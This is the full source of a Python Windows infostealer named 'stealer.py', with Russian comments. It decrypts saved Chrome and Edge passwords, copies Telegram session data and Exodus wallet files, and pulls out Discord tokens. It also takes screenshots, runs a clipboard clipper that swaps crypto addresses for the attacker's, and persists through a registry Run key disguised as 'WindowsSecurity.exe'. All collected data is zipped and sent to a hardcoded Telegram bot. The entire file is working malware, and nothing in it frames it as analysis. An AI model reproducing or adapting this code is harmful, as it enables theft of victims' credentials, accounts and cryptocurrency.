# language: Python, file: stealer.py
import os, sys, json, time, threading, sqlite3, shutil, base64, zipfile, io, tempfile, re
import ctypes, ctypes.wintypes, requests, pyperclip
import win32crypt
from PIL import ImageGrab

# ================= НАСТРОЙКИ =================
TG_TOKEN = "8642013882:AAFdDVh_PVp73BK_wRottcRkMKUU73rohUI"
TG_CHAT = "8224529558"
WALLETS = {
    "BTC": "bc1qтвой_кошелек_btc",
    "ETH": "0xтвой_кошелек_eth",
    "TON": "UQтвой_кошелек_ton"
}
# ============================================

OUT_DIR = os.path.join(tempfile.gettempdir(), "AqDiamond_Logs")
os.makedirs(OUT_DIR, exist_ok=True)

def log(msg):
    try:
        with open(os.path.join(OUT_DIR, "log.txt"), "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    except: pass

# --- 1. ОТПРАВКА В TELEGRAM ---
def send_tg(text, file_path=None):
    try:
        if file_path:
            url = f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument"
            with open(file_path, "rb") as f:
                requests.post(url, data={"chat_id": TG_CHAT, "caption": text}, files={"document": f}, timeout=30)
        else:
            url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": TG_CHAT, "text": text}, timeout=10)
    except Exception as e:
        log(f"TG Error: {e}")

# --- 2. СТИЛЕР: ПАРОЛИ И КУКИ ---
def steal_browsers():
    log("Кража браузеров...")
    browsers = {
        "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
        "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
    }
    for name, path in browsers.items():
        if not os.path.exists(path): continue
        for profile in os.listdir(path):
            profile_path = os.path.join(path, profile)
            if not os.path.isdir(profile_path): continue
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                try:
                    tmp = os.path.join(OUT_DIR, f"{name}_{profile}_logins.db")
                    shutil.copy2(login_db, tmp)
                    conn = sqlite3.connect(tmp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    with open(os.path.join(OUT_DIR, "passwords.txt"), "a", encoding="utf-8") as f:
                        for row in cursor.fetchall():
                            url, user, enc_pass = row
                            try:
                                # Расшифровка DPAPI
                                decrypted = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8')
                                f.write(f"[{name}] URL: {url} | Login: {user} | Pass: {decrypted}\n")
                            except: pass
                    conn.close()
                    os.remove(tmp)
                except Exception as e: log(f"Err {name}: {e}")

# --- 3. СТИЛЕР: TELEGRAM TDATA ---
def steal_telegram():
    log("Кража Telegram...")
    tg_path = os.path.expandvars(r"%APPDATA%\Telegram Desktop\tdata")
    if os.path.exists(tg_path):
        try:
            shutil.copytree(tg_path, os.path.join(OUT_DIR, "Telegram_tdata"))
            log("Telegram скопирован.")
        except Exception as e: log(f"TG err: {e}")

# --- 4. СТИЛЕР: DISCORD TOKENS ---
def steal_discord():
    log("Кража Discord...")
    paths = [os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb")]
    tokens = set()
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith((".ldb", ".log")):
                    try:
                        with open(os.path.join(path, file), "r", errors="ignore") as f:
                            for line in f:
                                tokens.update(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line))
                    except: pass
    if tokens:
        with open(os.path.join(OUT_DIR, "discord_tokens.txt"), "w") as f:
            f.write("\n".join(tokens))

# --- 5. СТИЛЕР: КРИПТО ---
def steal_wallets():
    log("Поиск кошельков...")
    wallet_paths = {"Exodus": os.path.expandvars(r"%APPDATA%\Exodus\exodus.wallet")}
    for name, path in wallet_paths.items():
        if os.path.exists(path):
            try:
                dest = os.path.join(OUT_DIR, f"Wallet_{name}")
                if os.path.isdir(path): shutil.copytree(path, dest)
                else: shutil.copy2(path, dest)
            except Exception as e: log(f"Wallet err: {e}")

# --- 6. СКРИНШОТ ---
def take_screenshot():
    try:
        img = ImageGrab.grab()
        img.save(os.path.join(OUT_DIR, "screenshot.png"))
    except: pass

# --- 7. КЛИППЕР ---
def clipper():
    log("Клиппер запущен...")
    patterns = {
        "BTC": re.compile(r'\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b'),
        "ETH": re.compile(r'\b0x[a-fA-F0-9]{40}\b'),
        "TON": re.compile(r'\b(UQ|EQ)[a-zA-Z0-9_-]{46}\b')
    }
    while True:
        try:
            clip = pyperclip.paste()
            if clip:
                for coin, pattern in patterns.items():
                    if pattern.match(clip) and coin in WALLETS:
                        if clip != WALLETS[coin]:
                            pyperclip.copy(WALLETS[coin])
                            log(f"Клиппер: {coin} заменен")
        except: pass
        time.sleep(1)

# --- 8. АРХИВАЦИЯ И ОТПРАВКА ---
def zip_and_send():
    log("Архивация...")
    zip_path = os.path.join(tempfile.gettempdir(), "logs.zip")
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(OUT_DIR):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, OUT_DIR)
                    zipf.write(full_path, arcname)
        send_tg("📦 Логи собраны!", zip_path)
    except Exception as e:
        log(f"ZIP err: {e}")

# --- 9. АВТОЗАПУСК ---
def persist():
    try:
        appdata = os.getenv("APPDATA")
        dest = os.path.join(appdata, "WindowsSecurity.exe")
        if not os.path.exists(dest) and getattr(sys, "frozen", False):
            shutil.copy(sys.executable, dest)
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSecurity", 0, winreg.REG_SZ, dest)
            winreg.CloseKey(key)
    except: pass

def main():
    try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: pass
    
    log("Старт...")
    persist()
    
    # Запускаем клиппер в фоне
    threading.Thread(target=clipper, daemon=True).start()
    
    # Собираем данные
    steal_browsers()
    steal_telegram()
    steal_discord()
    steal_wallets()
    take_screenshot()
    
    # Пакуем и шлем
    zip_and_send()

if __name__ == "__main__":
    main()
